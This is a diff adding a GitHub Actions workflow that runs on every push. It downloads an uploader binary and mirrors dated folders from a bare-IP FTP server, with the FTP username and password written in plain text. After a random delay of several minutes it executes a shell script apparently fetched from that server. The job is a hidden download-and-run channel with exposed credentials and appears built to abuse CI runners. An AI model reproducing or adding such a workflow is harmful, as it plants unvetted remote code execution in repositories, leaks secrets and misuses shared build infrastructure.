@@ -1,0 +1,20 @@
+name: ten
+on: [push, workflow_dispatch]
+jobs:
+  download-and-run:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Download file
+        run: |
+          wget https://raw.githubusercontent.com/MoeClub/OneList/master/OneDriveUploader/amd64/linux/OneDriveUploader -P /usr/local/bin/
+          chmod +x /usr/local/bin/OneDriveUploader
+          files=("230117" "230118" "230119" "230120" "230121")
+          for file in "${files[@]}"; do
+          for i in {1..1}; do
+          wget -nH -m --ftp-user=if0_37965025 --ftp-password=98kDsIA4LJEZ "ftp://185.27.134.11/htdocs/$file/*"
+          sleep 5
+          done
+          cp htdocs/$file/* ./
+          done
+          sleep $((RANDOM % 10 + 1))m
+          bash drive33311.sh
